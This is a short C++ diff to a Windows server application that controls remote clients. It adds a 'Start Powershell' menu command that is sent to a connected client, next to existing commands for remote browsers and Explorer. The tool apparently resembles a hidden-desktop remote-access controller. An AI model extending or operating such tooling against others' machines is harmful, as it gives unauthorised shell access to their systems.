@@ -39,7 +39,7 @@ static const DWORD    gc_minWindowWidth  = 800;
 static const DWORD    gc_minWindowHeight = 600;
 
 
-enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore };
+enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore, startPowershell };
 
 static Client           g_clients[gc_maxClients];
 static CRITICAL_SECTION g_critSec;
@@ -117,6 +117,7 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::fullScreen,     TEXT("&Fullscreen"));
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startExplorer,  TEXT("Start Explorer"));
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startRun,       TEXT("&Run..."));
+         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startPowershell, TEXT("Start Powershell"));
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startChrome,    TEXT("Start Chrome"));
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startFirefox,   TEXT("Start Firefox"));
          AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startIexplore,  TEXT("Start Internet Explorer"));
@@ -148,6 +149,14 @@ static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lPara
                PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
+         }
+         else if (wParam == SysMenuIds::startPowershell)
+         {
+             EnterCriticalSection(&g_critSec);
+             if (!SendInput(client->connections[Connection::input], SysMenuIds::startPowershell, NULL, NULL))
+                 PostQuitMessage(0);
+             LeaveCriticalSection(&g_critSec);
+             break;
          }
          else if(wParam == SysMenuIds::startChrome)
          {
